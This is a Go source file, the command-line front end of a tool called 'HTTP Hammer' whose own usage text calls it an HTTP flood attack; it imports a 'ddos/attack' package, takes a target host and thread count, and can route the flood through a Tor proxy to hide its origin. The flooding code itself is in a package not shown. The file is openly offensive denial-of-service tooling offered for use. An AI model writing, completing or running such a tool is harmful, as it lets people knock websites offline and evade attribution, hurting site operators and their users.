package main

import (
	"ddos/attack"
	"fmt"
	"os"

	log "github.com/sirupsen/logrus"
	"github.com/urfave/cli/v2"
)

func main() {
	attack.Init()
	app := &cli.App{
		Name:    "HTTP Hammer",
		Version: attack.Version,
		Usage:   "Http flood attack.",
		Flags: []cli.Flag{
			&cli.StringFlag{
				Name:     "host",
				Aliases:  []string{"hs"},
				Usage:    "Defines the host.",
				Required: true,
			},
			&cli.IntFlag{
				Name:    "threads",
				Aliases: []string{"t"},
				Usage:   "Defines the number of threads.",
				Value:   100,
			},
			&cli.BoolFlag{
				Name:  "tor",
				Usage: "Uses tor proxy to attack.",
				Value: false,
			},
			&cli.StringFlag{
				Name:  "tor-proxy",
				Usage: "Defines the tor proxy.",
				Value: "127.0.0.1:9050",
			},
		},
		Action: func(c *cli.Context) error {
			d := attack.New(c.String("host"), c.Int("threads"), c.Bool("tor"), c.String("tor-proxy"))
			d.Run()
			fmt.Scanln()
			return nil
		},
	}

	if err := app.Run(os.Args); err != nil {
		log.Fatal(err.Error())
	}
}
